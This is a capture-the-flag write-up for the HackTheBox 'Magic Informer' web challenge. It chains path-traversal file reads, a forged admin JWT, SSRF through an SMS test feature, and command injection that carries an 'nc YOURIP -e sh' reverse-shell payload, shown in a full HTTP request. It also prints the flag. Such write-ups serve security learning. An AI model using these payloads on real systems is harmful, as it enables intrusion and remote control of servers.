<!-- @format -->

# The Magic Informer

CTF Event: HTB University CTF
Category: Web
Difficulty: Easy
Platform: HackTheBox
Status: Unposted
Tags: JWT, LFI, SSRF, command-injection

## Description

> The Magic Informer is the only byte-sized wizarding newspaper that brings the best magical news to you at your fingertips! Due to popular demand and bold headlines, we are often targeted by wizards and hackers alike. We need you to pentest our news portal and see if you can gain access to our server.

## Steps

Opening the URL for the challenge in the browser reveals what looks like a newspaper with a “WE ARE HIRING!” button at the bottom

![Untitled](The%20Magic%20Informer/Untitled.png)

which redirects us to the `/register` page to create an account and login with that account which returns a JWT as a cookie and redirects us to `/dashboard` which contained a form to save our information as well as upload a doc/docx file attempting to upload a file will return the file hash and append `.docx` to it

![Untitled](The%20Magic%20Informer/Untitled%201.png)

and a link will appear to `/download?resume=FILEHASH.docx` which looked very unsafe way to download a file.

attempting replace the filehash.docx with a random string will return that the file does not exist in the directory `/app/uploads/`

![Untitled](The%20Magic%20Informer/Untitled%202.png)

and just like that we have a local file inclusion vulnerability that we can use to download the source code for the server with the payload `/download?resume=....//index.js` which will download the JavaScript file from which we figure that the file `/app/helpers/JWTHelper.js` contains the functions to sign and verify the cookies

```jsx
import jwt from "jsonwebtoken";
import crypto from "crypto";
const APP_SECRET = crypto.randomBytes(69).toString("hex");

const sign = (data) => {
	data = Object.assign(data);
	return jwt.sign(data, APP_SECRET, { algorithm: "HS256" });
};

const decode = async (token) => {
	return jwt.decode(token);
};

export { sign, decode };
```

and that was when we noticed that the decode function does not use the `APP_SECRET` to verify the token which means we can forge our own JWT and login as admin by changing the username field in the JWT to admin `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTg2NTAzfQ.1xFGCHkALzoN7pZngGUENHSURbA82bejywPMXzZSqYE`

which will give us access to the admin panel at `/admin` that contains a SQL prompt that seems to be only accessible from localhost.

we can also find an SMS gateway that seems to send HTTP requests

![Untitled](The%20Magic%20Informer/Untitled%203.png)

which we can use to make a server-side request to localhost and execute the SQL query. However, the SQL Prompt requires a DEBUG_PASS which can be downloaded using our previous LFI exploit at `/download?resume=....//....//debug.env` which contained the debug pass `DEBUG_PASS=CzliwZJkV60hpPJ`

we then constructed a request to the localhost SQL exec route that contained a payload to run the SQL query and then chain a Netcat command to spawn a reverse shell

![Untitled](The%20Magic%20Informer/Untitled%204.png)

```
POST /api/sms/test HTTP/1.1
Host: SERVERIP:SERVERPORT
Content-Length: 470
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://SERVERIP:SERVERPORT
Referer: http://SERVERIP:SERVERPORT/sms-settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTg2NTAzfQ.1xFGCHkALzoN7pZngGUENHSURbA82bejywPMXzZSqYE
Connection: close

{"verb":"POST","url":"http://127.0.0.1:1337/debug/sql/exec","params":"{\"sql\":\"select * from users;' `nc YOURIP -e sh` #\",\"password\":\"CzliwZJkV60hpPJ\"}","headers":"Content-Type: application/json\nAuthorization: Basic YWRtaW46YWRtaW4=\nCookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjY5OTg2NTAzfQ.1xFGCHkALzoN7pZngGUENHSURbA82bejywPMXzZSqYE","resp_ok":"<status>ok</status>","resp_bad":"<status>error</status>"}
```

which spawns a reverse shell and by executing `ls` at the root dir we will find a file called `readflag` which when executed will reveal the flag to us :D

![Untitled](The%20Magic%20Informer/Untitled%205.png)

## Flag

`HTB{br0k3n_4u7h_55RF_4s_4_s3rv1c3_d3bug_ftw}`
